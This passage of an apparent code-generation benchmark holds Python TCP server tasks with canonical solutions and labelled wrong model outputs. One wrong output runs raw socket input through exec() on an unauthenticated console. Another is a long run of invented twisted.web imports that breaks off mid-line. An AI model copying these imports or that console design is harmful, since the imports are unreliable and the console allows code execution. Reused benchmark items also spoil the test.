Initializes with the given environment.\n- parse_telnet(data) -> str - Processes telnet control characters from input.\n- raw_input(prompt=None) -> str - Reads input from client with optional prompt.\n- write(data) -> None - Writes output to the client.\n- run(server) -> None - Starts the interactive console session with the given server.\n\nFunction Description: spawn - Creates and starts the TCP server in a separate thread.\n\nInput:\n- env: [Any] - The Python environment/namespace to be used in the console sessions.\n\nOutput:\n- tuple: (threading.Thread, socketserver.TCPServer) - Returns the server thread and TCP server instance.",
    "Canonical_solution": "import socket\nimport threading\nimport sys\nif sys.version_info < (3, 0):\n    import SocketServer as socketserver\nelse:\n    import socketserver\nimport re\n\nclass PythonConsoleServer(socketserver.BaseRequestHandler):\n    env = None\n    \n    def setup(self):\n        self.console = TerminatorConsole(PythonConsoleServer.env)\n\n    def handle(self):\n        try:\n            self.socketio = self.request.makefile(mode='rw')\n            sys.stdout = self.socketio\n            sys.stdin = self.socketio\n            sys.stderr = self.socketio\n            self.console.run(self)\n        finally:\n            sys.stdout = sys.__stdout__\n            sys.stdin = sys.__stdin__\n            sys.stderr = sys.__stderr__\n            self.socketio.close()\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n\n    def parse_telnet(self, data):\n        data = re.sub('([^\\r])\\r', '\\\\1', data)\n        data = data.replace('\\r\\x00', '')\n        data = data.replace('\\x00', '')\n        return data\n\n    def raw_input(self, prompt=None):\n        if prompt:\n            self.write(prompt)\n\n        buf = ''\n        while True:\n            data = self.server.socketio.read(1)\n            if data == '\\n' or data == '\\006':\n                buf = self.parse_telnet(buf + data)\n                if buf != '':\n                    return buf\n            elif data == '\\004' or data == '':\n                raise EOFError\n            else:\n                buf += data\n\n    def write(self, data):\n        self.server.socketio.write(data)\n        self.server.socketio.flush()\n\n    def run(self, server):\n        self.server = server\n        self.interact()\n\ndef spawn(env):\n    PythonConsoleServer.env = env\n    tcpserver = socketserver.TCPServer(('127.0.0.1', 0), PythonConsoleServer)\n    debugserver = threading.Thread(target=tcpserver.serve_forever, name=\"DebugServer\")\n    debugserver.setDaemon(True)\n    debugserver.start()\n    return (debugserver, tcpserver)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\nimport threading\nimport io\n\nclass PythonConsoleServer(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.env = env\n        self.console = TerminatorConsole(self.env)\n        self.socketio = io.TextIOWrapper(request, write_through=True)\n        super().__init__(request, client_address, server)\n\n    def setup(self):\n        self.console.setup()\n\n    def handle(self):\n        self.console.run(self)\n\n    def verify_request(self, request, client_address):\n        return True\n\n    def finish(self):\n        pass\n\nclass TerminatorConsole:\n    def __init__(self, env):\n        self.env = env\n        self.server = None\n\n    def parse_telnet(self, data):\n        return data\n\n    def raw_input(self, prompt=None):\n        self.write(prompt)\n        return self.socketio.readline()\n\n    def write(self, data):\n        self.socketio.write(data)\n        self.socketio.flush()\n\n    def run(self, server):\n        self.server = server\n        while True:\n            try:\n                line = self.raw_input()\n                if not line:\n                    break\n                exec(line, self.env)\n            except Exception as e:\n                self.write(str(e) + '\\n')\n\ndef spawn(env):\n    server = socketserver.ThreadingTCPServer(('localhost', 0), PythonConsoleServer, bind_and_activate=False)\n    server.allow_reuse_address = True\n    server.server_bind()\n    server.server_activate()\n    thread = threading.Thread(target=server.serve_forever)\n    thread.start()\n    return thread, server\n```"
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a threaded TCP server in Python that handles client connections and messages, allowing for bidirectional communication while maintaining only one active client connection at a time.\n\nClass Description: MessageServer is a threaded TCP server that inherits from SocketServer.ThreadingTCPServer. It manages client connections, processes incoming messages, and provides methods for sending messages to the connected client. The server runs in a separate daemon thread and maintains state about the current client connection.\n\nAttributes:\n- server_thread: [Thread] - The thread in which the server runs\n- request_verified: [Event] - Event flag indicating whether a client connection has been verified\n- _client_socket: [socket] - The socket object of the currently connected client (None if no client is connected)\n- message_handled: [Event] - Event flag indicating when a message has been processed\n\nMethods:\n- __init__(server_address) -> [None] - Initializes the server with the given address and starts the server thread\n- send(message) -> [None] - Sends a message to the connected client if one exists\n- get_client_socket() -> [socket] - Returns the client socket after waiting for a connection to be verified\n- verify_request(request, client_address) -> [bool] - Verifies and accepts/rejects incoming connections (allows only one active connection)\n\nClass Description: MessageTCPHandler is a request handler class that inherits from SocketServer.BaseRequestHandler. It processes incoming messages from clients and manages the communication loop.\n\nAttributes: (inherits from BaseRequestHandler)\n- request: [socket] - The client connection socket\n- client_address: [tuple] - The client address\n- server: [MessageServer] - Reference to the server instance\n\nMethods:\n- handle() -> [None] - Main handler method that processes incoming messages in a loop, handles disconnections, and manages communication with the client",
    "Canonical_solution": "import threading\nimport logging\nimport sys\nimport socket\nimport unrealcv\nif (sys.version_info > (3, 0)):\n    import socketserver as SocketServer\nelse:\n    import SocketServer\n\nSocketServer.ThreadingMixIn.daemon_threads = True\nSocketServer.TCPServer.allow_reuse_address = True\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG)\nlogger.addHandler(logging.StreamHandler(sys.stdout))\n\nclass MessageTCPHandler(SocketServer.BaseRequestHandler):\n    def handle(self):\n        assert self.request != None\n\n        while True:\n            try:\n                logger.debug('Start to handle message')\n                self.server.message_handled.clear()\n                message = unrealcv.SocketMessage.ReceivePayload(self.request)\n\n                if message:\n                    unrealcv.SocketMessage.WrapAndSendPayload(self.request, message)\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Client release connection')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                    break\n            except Exception as e:\n                if e.errno == 10054:\n                    logger.debug('Remote connection is forcibly closed')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Unknown exception %s' % str(e))\n                    self.server.message_handled.set()\n\nclass MessageServer(SocketServer.ThreadingTCPServer):\n    def __init__(self, server_address):\n        super(MessageServer, self).__init__(server_address, MessageTCPHandler)\n        \n        def server_thread():\n            cur_thread = threading.current_thread()\n            logger.info('Started in thread %s' % cur_thread.name)\n            self.serve_forever()\n            logger.info(\"The server thread is stopped\")\n\n        self.server_thread = threading.Thread(target=server_thread)\n        self.server_thread.setDaemon(1)\n        self.server_thread.start()\n        \n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n\n    def send(self, message):\n        if self._client_socket:\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, message)\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        logger.debug('Return client socket')\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        logger.debug('Got a connection from %s' % str(client_address))\n        if self._client_socket:\n            logger.debug('Reject, only accept one connection')\n            accepted = False\n        else:\n            logger.debug('Accept, new connection')\n            self._client_socket = request\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, 'connected to Python Message Server')\n            accepted = True\n\n        self.request_verified.set()\n        return accepted",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport SocketServer\nimport threading\nimport socket\nimport time\n\nclass MessageServer(SocketServer.ThreadingTCPServer):\n    def __init__(self, server_address):\n        SocketServer.ThreadingTCPServer.__init__(self, server_address, MessageTCPHandler)\n        self.server_thread = threading.Thread(target=self.serve_forever)\n        self.server_thread.daemon = True\n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n        self.server_thread.start()\n\n    def send(self, message):\n        if self._client_socket:\n            self._client_socket.sendall(message)\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        if self._client_socket is None:\n            self._client_socket = request\n            self.request_verified.set()\n            return True\n        else:\n            request.close()\n            return False\n\nclass MessageTCPHandler(SocketServer.BaseRequestHandler):\n    def handle(self):\n        while True:\n            try:\n                data = self.request.recv(1024)\n                if data:\n                    print \"Received message:\", data\n                    # Process the message here\n                    self.server.message_handled.set()\n                else:\n                    print \"Client disconnected\"\n                    self.server._client_socket = None\n                    break\n            except socket.error:\n                print \"Socket error\"\n                break\n            except Exception as e:\n                print \"Exception:\", e\n                break\n```\n"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Implement a TCP server for clock synchronization that responds to client requests with the current time provided by a time function.\n\nClass Description: The system consists of three classes working together to create a threaded TCP server that handles time synchronization requests. The server responds to \"sync\" messages with the current timestamp.\n\nAttributes:\n\nserver: [Time_Echo_Server] - The TCP server instance handling client connections\nthread: [threading.Thread] - The thread running the server's serve_forever loop\n\nMethods:\n\n__init__: [Name](time_fn: callable) -> [None] - Initializes the clock synchronization server with a time-providing function\nstop: [Name]() -> [None] - Shuts down the server and joins the server thread\nport: [property]() -> [int] - Returns the port number the server is bound to (read-only)\nhost: [property]() -> [str] - Returns the host address the server is bound to (read-only)",
    "Canonical_solution": "import socket\nimport socketserver\nimport struct\nimport threading\nfrom functools import partial\n\nclass Time_Echo(socketserver.BaseRequestHandler):\n    def __init__(self, *args, time_fn, **kwargs):\n        self.time_fn = time_fn\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        while True:\n            data = self.request.recv(4)\n            if not data:\n                break\n            if data.decode(\"utf-8\") == \"sync\":\n                self.request.send(struct.pack(\"<d\", self.time_fn()))\n\nclass Time_Echo_Server(socketserver.ThreadingTCPServer):\n    def __init__(self, *, time_fn, host=\"\", **kwargs):\n        handler_class = partial(Time_Echo, time_fn=time_fn)\n        super().__init__((host, 0), handler_class, **kwargs)\n        self.allow_reuse_address = True\n\n    @property\n    def host(self) -> str:\n        return self.server_address[0]\n\n    @property\n    def port(self) -> int:\n        return self.server_address[1]\n\nclass Clock_Sync_Server:\n    def __init__(self, time_fn):\n        self.server = Time_Echo_Server(time_fn=time_fn)\n        self.thread = threading.Thread(target=self.server.serve_forever)\n        self.thread.start()\n\n    def stop(self):\n        self.server.shutdown()\n        self.thread.join()\n\n    @property\n    def port(self):\n        return self.server.port\n\n    @property\n    def host(self):\n        return self.server.host",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socket\nimport threading\nimport time\n\nclass Time_Echo_Server:\n    def __init__(self, time_fn):\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.server.bind(('localhost', 0))\n        self.server.listen(1)\n        self.thread = threading.Thread(target=self.serve_forever)\n        self.time_fn = time_fn\n\n    def stop(self):\n        self.server.close()\n        self.thread.join()\n\n    @property\n    def port(self):\n        return self.server.getsockname()[1]\n\n    @property\n    def host(self):\n        return self.server.getsockname()[0]\n\n    def serve_forever(self):\n        while True:\n            client, addr = self.server.accept()\n            data = client.recv(1024).decode()\n            if data == 'sync':\n                client.sendall(str(self.time_fn()).encode())\n            client.close()\n```\n"
  },
  {
    "Task_id": 417,
    "Instruction": "Task Description: Implement a TCP server in Python using the socketserver module to handle client requests, process data, and send responses back to the client.\n\nClass Description: The TCPServer class initializes and manages a TCP server that listens for client connections, processes incoming data, and sends appropriate responses. The EchoRequestHandler class handles individual client requests by processing received data and generating responses.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections.\n- server: socketserver.TCPServer - The instance of the TCP server that handles client connections.\n\nMethods:\n- __init__(port: int) -> None - Initializes the TCPServer instance with the specified port number.\n- start() -> None - Starts the TCP server, binds it to 'localhost' and the specified port, and begins listening for client connections indefinitely.\n- stop() -> None - Shuts down the TCP server if it is running.\n\nClass Description: The EchoRequestHandler class inherits from socketserver.BaseRequestHandler and defines how to handle incoming client requests.\n\nMethods:\n- handle() -> None - Processes the client's request by receiving data, decoding it, and performing actions based on the received data (either learning or classifying). It then sends a response back to the client. The method uses the following steps:\n  1. Receives data from the client using recv().\n  2. Decodes the data from UTF-8 format.\n  3. Parses the data to extract group and filename.\n  4. Depending on the presence of a filename, either performs a learning operation or a classification operation.\n  5. Encodes the result as JSON and sends it back to the client using send().",
    "Canonical_solution": "import json\nimport socketserver\nimport pickle\nimport numpy\nfrom random import shuffle\n\nclass EchoRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        data = self.request.recv(1024)\n        data = data.decode('utf-8').strip()\n        print(\"received data:'%s'\" % data)\n        group = data.split('=')[0].strip()\n        filename = data.split('=')[1].strip()\n        payload = \"error\".encode('utf-8')\n        if len(group) == 0:\n            self.request.send(payload)\n            return\n        randomF = RF()\n        if len(filename) == 0:\n            payload = json.dumps(randomF.learn(group, 0.9)).encode('utf-8')\n        else:\n            payload = json.dumps(\n                randomF.classify(\n                    group,\n                    filename +\n                    \".rftemp\")).encode('utf-8')\n        self.request.send(payload)\n        return\n\nclass TCPServer:\n    def __init__(self, port):\n        self.port = port\n        self.server = None\n\n    def start(self):\n        socketserver.TCPServer.allow_reuse_address = True\n        address = ('localhost', self.port)\n        self.server = socketserver.TCPServer(address, EchoRequestHandler)\n        self.server.serve_forever()\n\n    def stop(self):\n        if self.server:\n            self.server.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "```python\nimport socketserver\nimport json\n\nclass TCPServer(socketserver.TCPServer):\n    def __init__(self, port: int) -> None:\n        self.port = port\n        self.server = socketserver.TCPServer(('localhost', port), EchoRequestHandler)\n\n    def start(self) -> None:\n        self.server.serve_forever()\n\n    def stop(self) -> None:\n        self.server.shutdown()\n\nclass EchoRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self) -> None:\n        data = self.request.recv(1024).strip().decode('utf-8')\n        group, filename = data.split(',')\n        if filename:\n            # Perform learning operation\n            result = {'status': 'learned', 'group': group, 'filename': filename}\n        else:\n            # Perform classification operation\n            result = {'status': 'classified', 'group': group}\n        response = json.dumps(result).encode('utf-8')\n        self.request.sendall(response)\n```"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Implement a TCP server using Twisted framework in Python that supports WebSocket connections, handles incoming data, and manages connection lifecycle events.\n\nClass Description: The solution consists of two classes: `HelloServerProtocol` (handles protocol-level operations) and `HelloServerFactory` (manages server configuration and startup).\n\nAttributes:\n\n- `HelloServerProtocol`:\n  - transport: [object] - Twisted transport object representing the connection\n- `HelloServerFactory`:\n  - host: [str] - Server host address (default: \"127.0.0.1\")\n  - port: [int] - Server port number (default: 9000)\n  - wrappedFactory: [object] - Twisted Factory instance for protocol handling\n  - factory: [object] - WebSocket-wrapped factory instance\n\nMethods:\n\n- `HelloServerProtocol`:\n  - connectionMade() -> None - Called when a new connection is established\n  - dataReceived(data: bytes) -> None - Called when data is received from client\n- `HelloServerFactory`:\n  - __init__(host: str = \"127.0.0.1\", port: int = 9000, enableCompression: bool = False, autoFragmentSize: int = 1024) -> None - Initializes factory with configuration\n  - start() -> None - Starts the TCP server and enters event loop",
    "Canonical_solution": "from twisted.internet.protocol import Protocol, Factory\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WrappingWebSocketServerFactory\n\nclass HelloServerProtocol(Protocol):\n    def connectionMade(self):\n        print(\"connectionMade\", self.transport.getHost(), self.transport.getPeer())\n        self.transport.write('how are you?' * 100)\n\n    def dataReceived(self, data):\n        print(\"dataReceived: {}\".format(data))\n\nclass HelloServerFactory:\n    def __init__(self, host=\"127.0.0.1\", port=9000, enableCompression=False, autoFragmentSize=1024):\n        self.host = host\n        self.port = port\n        self.wrappedFactory = Factory.forProtocol(HelloServerProtocol)\n        self.factory = WrappingWebSocketServerFactory(\n            self.wrappedFactory,\n            f\"ws://{self.host}:{self.port}\",\n            enableCompression=enableCompression,\n            autoFragmentSize=autoFragmentSize\n        )\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 68,
    "wrong_result": "```python\nfrom twisted.internet.protocol import Protocol, Factory\nfrom twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom twisted.web.resource import Resource\nfrom twisted.web import server\nfrom twisted.web import http\nfrom twisted.web import resource\nfrom twisted.web import static\nfrom twisted.web import web\nfrom twisted.web import xmlrpc\nfrom twisted.web import wsgi\nfrom twisted.web import http_headers\nfrom twisted.web import http11\nfrom twisted.web import http2\nfrom twisted.web import http_serve\nfrom twisted.web import http_client\nfrom twisted.web import http_cookies\nfrom twisted.web import http_headers\nfrom twisted.web import http_request\nfrom twisted.web import http_server\nfrom twisted.web import http_spy\nfrom twisted.web import http_useragent\nfrom twisted.web import http_vsn\nfrom twisted.web import http_vsn_enum\nfrom twisted.web import http_xmlrpc\nfrom twisted.web import http_xmlrpc2\nfrom twisted.web import http_xmlrpc3\nfrom twisted.web import http_xmlrpc4\nfrom twisted.web import http_xmlrpc5\nfrom twisted.web import http_xmlrpc6\nfrom twisted.web import http_xmlrpc7\nfrom twisted.web import http_xmlrpc8\nfrom twisted.web import http_xmlrpc9\nfrom twisted.web import http_xmlrpc10\nfrom twisted.web import http_xmlrpc11\nfrom twisted.web import http_xmlrpc12\nfrom twisted.web import http_xmlrpc13\nfrom twisted.web import http_xmlrpc14\nfrom twisted.web import http_xmlrpc15\nfrom twisted.web import http_xmlrpc16\nfrom twisted.web import http_xmlrpc17\nfrom twisted.web import http_xmlrpc18\nfrom twisted.web import http_xmlrpc19\nfrom twisted.web import http_xmlrpc20\nfrom twisted.web import http_xmlrpc21\nfrom twisted.web import http_xmlrpc22\nfrom twisted.web import http_xmlrpc23\nfrom twisted.web import http_xmlrpc24\nfrom twisted.web import http_xmlrpc25\nfrom twisted.web import http_xmlrpc26\nfrom twisted.web import http_xmlrpc27\nfrom twisted.web import http_xmlrpc28\nfrom twisted.web import http_xmlrpc29\nfrom twisted.web import http_xmlrpc30\nfrom twisted.web import http_xmlrpc31\nfrom twisted.web import http_xmlrpc32\nfrom twisted.web import http_xmlrpc33\nfrom twisted.web import http_xmlrpc34\nfrom twisted.web import http_xmlrpc35\nfrom twisted.web import http_xmlrpc36\nfrom twisted.web import http_xmlrpc37\nfrom twisted.web import http_xmlrpc38\nfrom twisted.web import http_xmlrpc39\nfrom twisted.web import http_xmlrpc40\nfrom twisted.web import http_xmlrpc41\nfrom twisted.web import http_xmlrpc42\nfrom twisted.web import http_xmlrpc43\nfrom twisted.web import http_xmlrpc44\nfrom twisted.web import http_xmlrpc45\nfrom twisted.web import http_xmlrpc46\nfrom twisted.web import http_xmlrpc47\nfrom twisted.web import http_xmlrpc48\nfrom twisted.web import http_xmlrpc49\nfrom twisted.web import http_xmlrpc50\nfrom twisted.web import http_xmlrpc51\nfrom twisted.web import http_xmlrpc52\nfrom twisted.web import http_xmlrpc53\nfrom twisted.web import http_xmlrpc54\nfrom twisted.web import http_xmlrpc55\nfrom twisted.web import http_xmlrpc56\nfrom twisted.web import http_xmlrpc57\nfrom twisted.web import http_xmlrpc58\nfrom twisted.web import http_xmlrpc59\nfrom twisted.web import http_xmlrpc60\nfrom twisted.web import http_xmlrpc61\nfrom twisted.web import http_xmlrpc62\nfrom twisted.web import http_xmlrpc63\nfrom twisted.web import http_xmlrpc64\nfrom twisted.web import http_xmlrpc65\nfrom twisted.web import http_xmlrpc66\nfrom twisted.web import http_xmlrpc67\nfrom twisted.web import http_xmlrpc68\nfrom twisted.web import http_xmlrpc69\nfrom twisted.web import http_xmlrpc70\nfrom twisted.web import http_xmlrpc71\nfrom twisted.web import http_xmlrpc72\nfrom twisted.web import http_xmlrpc73\nfrom twisted.web import http_xmlrpc74\nfrom twisted.web import http_xmlrpc75\nfrom twisted.web import http_xmlrpc76\nfrom twisted.web import http_xmlrpc77\nfrom twisted.web import http_xmlrpc78\nfrom twisted.web import http_xmlrpc79\nfrom twisted.web import http_xmlrpc80\nfrom twisted.web import http_xmlrpc81\nfrom twisted.web import http_xmlrpc82\nfrom twisted.web import http_xmlrpc83\nfrom twisted.web import http_xmlrpc84\nfrom twisted.web import http_xmlrpc85\nfrom twisted.web import http_xmlrpc86\nfrom twisted.web import http_xmlrpc87\nfrom twisted.web import http_xmlrpc88\nfrom twisted.web import http_xmlrpc89\nfrom twisted.web import http_xmlrpc90\nfrom twisted.web import http_xmlrpc91\nfrom twisted.web import http_xmlrpc92\nfrom twisted.web import http_xmlrpc93\nfrom twisted.web import http_xmlrpc94\nfrom twisted.web import http_xmlrpc95\nfrom twisted.web import http_xmlrpc96\nfrom twisted.web import http_xmlrpc97\nfrom twisted.web import http_xmlrpc98\nfrom twisted.web import http_xmlrpc99\nfrom twisted.web import http_xmlrpc100\nfrom twisted.web import http_xmlrpc101\nfrom twisted.web import http_xmlrpc102\nfrom twisted.web import http_xmlrpc103\nfrom twisted.web import http_xmlrpc104\nfrom twisted.web import http_xmlrpc105\nfrom twisted.web import http_xmlrpc106\nfrom twisted.web import http_xmlrpc107\nfrom twisted.web import http_xmlrpc108\nfrom twisted.web import http_xmlrpc109\nfrom twisted.web import http_xmlrpc110\nfrom twisted.web import http_xmlrpc111\nfrom twisted.web import http_xmlrpc112\nfrom twisted.web import http_xmlrpc113\nfrom twisted.web import http_xmlrpc114\nfrom twisted.web import http_xmlrpc115\nfrom twisted.web import http_xmlrpc116\nfrom twisted.web import http_xmlrpc117\nfrom twisted.web import http_xmlrpc118\nfrom twisted.web import http_xmlrpc119\nfrom twisted.web import http_xmlrpc120\nfrom twisted.web import http_xmlrpc121\nfrom twisted.web import http_xmlrpc122\nfrom twisted.web import http_xmlrpc123\nfrom twisted.web import http_xmlrpc124\nfrom twisted.web import http_xmlrpc125\nfrom twisted.web import http_xmlrpc126\nfrom twisted.web import http_xmlrpc127\nfrom twisted.web import http_xmlrpc128\nfrom twisted.web import http_xmlrpc129\nfrom twisted.web import http_xmlrpc130\nfrom twisted.web import http_xmlrpc131\nfrom twisted.web import http_xmlrpc132\nfrom twisted.web import http_xmlrpc133\nfrom twisted.web import http_xmlrpc134\nfrom twisted.web import http_xmlrpc135\nfrom twisted.web import http_xmlrpc136\nfrom twisted.web import http_xmlrpc137\nfrom twisted.web import http_xmlrpc138\nfrom twisted.web import http_xmlrpc139\nfrom twisted.web import http_xmlrpc140\nfrom twisted.web import http_xmlrpc141\nfrom twisted.web import http_xmlrpc142\nfrom twisted.web import http_xmlrpc143\nfrom twisted.web import http_xmlrpc144\nfrom twisted.web import http_xmlrpc145\nfrom twisted.web import http_xmlrpc146\nfrom twisted.web import http_xmlrpc147\nfrom twisted.web import http_xmlrpc148\nfrom twisted.web import http_xmlrpc149\nfrom twisted.web import http_xmlrpc150\nfrom twisted.web import http_xmlrpc151\nfrom twisted.web import http_xmlrpc152\nfrom twisted.web import http_xmlrpc153\nfrom twisted.web import http_xmlrpc154\nfrom twisted.web import http_xmlrpc155\nfrom twisted.web import http_xmlrpc156\nfrom twisted.web import http_xmlrpc157\nfrom twisted.web import http_xmlrpc158\nfrom twisted.web import http_xmlrpc159\nfrom twisted.web import http_xmlrpc160\nfrom twisted.web import http_xmlrpc161\nfrom twisted.web import http_xmlrpc162\nfrom twisted.web import http_xmlrpc163\nfrom twisted.web import http_xmlrpc164\nfrom twisted.web import http_xmlrpc165\nfrom twisted.web import http_xmlrpc166\nfrom twisted.web import http_xmlrpc167\nfrom twisted.web import http_xmlrpc168\nfrom twisted.web import http_xmlrpc169\nfrom twisted.web import http_xmlrpc170\nfrom twisted.web import http_xmlrpc171\nfrom twisted.web import http_xmlrpc172\nfrom twisted.web import http_xmlrpc173\nfrom twisted.web import http_xmlrpc174\nfrom twisted.web import http_xmlrpc175\nfrom twisted.web import http_xmlrpc176\nfrom twisted.web import http_xmlrpc177\nfrom twisted.web import http_xmlrpc178\nfrom twisted.web import http_xmlrpc179\nfrom twisted.web import http_xmlrpc180\nfrom twisted.web import http_xmlrpc181\nfrom twisted.web import http_xmlrpc182\nfrom twisted.web import http_xmlrpc183\nfrom twisted.web import http_xmlrpc184\nfrom twisted.web import http_xmlrpc185\nfrom twisted.web import http_xmlrpc186\nfrom twisted.web import http_xmlrpc187\nfrom twisted.web import http_xmlrpc188\nfrom twisted.web import http_xmlrpc189\nfrom twisted.web import http_xmlrpc190\nfrom twisted.web import http_xmlrpc191\nfrom twisted.web import http_xmlrpc192\nfrom twisted.web import http_xmlrpc193\nfrom twisted.web import http_xmlrpc194\nfrom twisted.web import http_xmlrpc195\nfrom twisted.web import http_xmlrpc196\nfrom twisted.web import http_xmlrpc197\nfrom twisted.web import http_xmlrpc198\nfrom twisted.web import http_xmlrpc199\nfrom twisted.web import http_xmlrpc200\nfrom twisted.web import http_xmlrpc201\nfrom twisted.web import http_xmlrpc202\nfrom twisted.web import http_xmlrpc203\nfrom twisted.web import http_xmlrpc204\nfrom twisted.web import http_xmlrpc205\nfrom twisted.web import http_xmlrpc206\nfrom twisted.web import http_xmlrpc207\nfrom twisted.web import http_xmlrpc208\nfrom twisted.web import http_xmlrpc209\nfrom twisted.web import http_xmlrpc210\nfrom twisted.web import http_xmlrpc211\nfrom twisted.web import http_xmlrpc212\nfrom twisted.web import http_xmlrpc213\nfrom twisted.web import http_xmlrpc214\nfrom twisted.web import http_xmlrpc215\nfrom twisted.web import http_xmlrpc216\nfrom twisted.web import http_xmlrpc217\nfrom twisted.web import http_xmlrpc218\nfrom twisted.web import http_xmlrpc219\nfrom twisted.web import http_xmlrpc220\nfrom twisted.web import http_xmlrpc221\nfrom twisted.web import http_xmlrpc222\nfrom twisted.web import http_xmlrpc223\nfrom twisted.web import http_xmlrpc224\nfrom twisted.web import http_xmlrpc225\nfrom twisted.web import http_xmlrpc226\nfrom twisted.web import http_xmlrpc227\nfrom twisted.web import http_xmlrpc228\nfrom twisted.web import http_xmlrpc229\nfrom twisted.web import http_xmlrpc230\nfrom twisted.web import http_xmlrpc231\nfrom twisted.web import http_xmlrpc232\nfrom twisted.web import http_xmlrpc233\nfrom twisted.web import http_xmlrpc234\nfrom twisted.web import http_xmlrpc235\nfrom twisted.web import http_xmlrpc236\nfrom twisted.web import http_xmlrpc237\nfrom twisted.web import http_xmlrpc238\nfrom twisted.web import http_xmlrpc239\nfrom twisted.web import http_xmlrpc240\nfrom twisted.web import http_xmlrpc241\nfrom twisted.web import http_xmlrpc242\nfrom twisted.web import http_xmlrpc243\nfrom twisted.web import http_xmlrpc244\nfrom twisted.web import http_xmlrpc245\nfrom twisted.web import http_xmlrpc246\nfrom twisted.web import http_xmlrpc247\nfrom twisted.web import http_xmlrpc248\nfrom twisted.web import http_xmlrpc249\nfrom twisted.web import http_xmlrpc250\nfrom twisted.web import http_xmlrpc251\nfrom twisted.web import http_xmlrpc252\nfrom twisted.web import http_xmlrpc253\nfrom twisted.web import http_xmlrpc254\nfrom twisted.web import http_xmlrpc255\nfrom twisted.web import http_xmlrpc256\nfrom twisted.web import http_xmlrpc257\nfrom twisted.web import http_xmlrpc258\nfrom twisted.web import http_xmlrpc259\nfrom twisted.web import http_xmlrpc260\nfrom twisted.web import http_xmlrpc261\nfrom twisted.web import http_xmlrpc262\nfrom twisted.web import http_xmlrpc263\nfrom twisted.web import http_xmlrpc264\nfrom twisted.web import http_xmlrpc265\nfrom twisted.web import http_xmlrpc266\nfrom twisted.web import http_xmlrpc267\nfrom twisted.web import http_xmlrpc268\nfrom twisted.web import http_xmlrpc269\nfrom twisted.web import http_xmlrpc270\nfrom twisted.web import http_xmlrpc271\nfrom twisted.web import http_xmlrpc272\nfrom twisted.web import http_xmlrpc273\nfrom twisted.web import http_xmlrpc274\nfrom twisted.web import http_xmlrpc275\nfrom twisted.web import http_xmlrpc276\nfrom twisted.web import http_xmlrpc277\nfrom twisted.web import http_xmlrpc278\nfrom twisted.web import http_xmlrpc279\nfrom twisted.web import http_xmlrpc280\nfrom twisted.web import http_xmlrpc281\nfrom twisted.web import http_xmlrpc282\nfrom twisted.web import http_xmlrpc283\nfrom twisted.web import http_xmlrpc284\nfrom twisted.web import http_xmlrpc285\nfrom twisted.web import http_xmlrpc286\nfrom twisted.web import http_xmlrpc287\nfrom twisted.web import http_xmlrpc288\nfrom twisted.web import http_xmlrpc289\nfrom twisted.web import http_xmlrpc290\nfrom twisted.web import http_xmlrpc291\nfrom twisted.web import http_xmlrpc292\nfrom twisted.web import http_xmlrpc293\nfrom twisted.web import http_xmlrpc294\nfrom twisted.web import http_xmlrpc295\nfrom twisted.web import http_xmlrpc296\nfrom twisted.web import http_xmlrpc297\nfrom twisted.web import http_xmlrpc298\nfrom twisted.web import http_xmlrpc299\nfrom twisted.web import http_xmlrpc300\nfrom twisted.web import http_xmlrpc301\nfrom twisted.web import http_xmlrpc302\nfrom twisted.web import http_xmlrpc303\nfrom twisted.web import http_xmlrpc304\nfrom twisted.web import http_xmlrpc305\nfrom twisted.web import http_xmlrpc306\nfrom twisted.web import http_xmlrpc307\nfrom twisted.web import http_xmlrpc308\nfrom twisted.web import http_xmlrpc309\nfrom twisted.web import http_xmlrpc310\nfrom twisted.web import http_xmlrpc311\nfrom twisted.web import http_xmlrpc312\nfrom twisted.web import http_xmlrpc313\nfrom twisted.web import http_xmlrpc314\nfrom twisted.web import http_xmlrpc315\nfrom twisted.web import http_xmlrpc316\nfrom twisted.web import http_xmlrpc317\nfrom twisted.web import http_xmlrpc318\nfrom twisted.web import http_xmlrpc319\nfrom twisted.web import http_xmlrpc320\nfrom twisted.web import http_xmlrpc321\nfrom twisted.web import http_xmlrpc322\nfrom twisted.web import http_xmlrpc323\nfrom twisted.web import http_xmlrpc324\nfrom twisted.web import http_xmlrpc325\nfrom twisted.web import http_xmlrpc326\nfrom twisted.web import http_xmlrpc327\nfrom twisted.web import http_xmlrpc328\nfrom twisted.web import http_xmlrpc329\nfrom twisted.web import http_xmlrpc330\nfrom twisted.web import http_xmlrpc331\nfrom twisted.web import http_xmlrpc332\nfrom twisted.web import 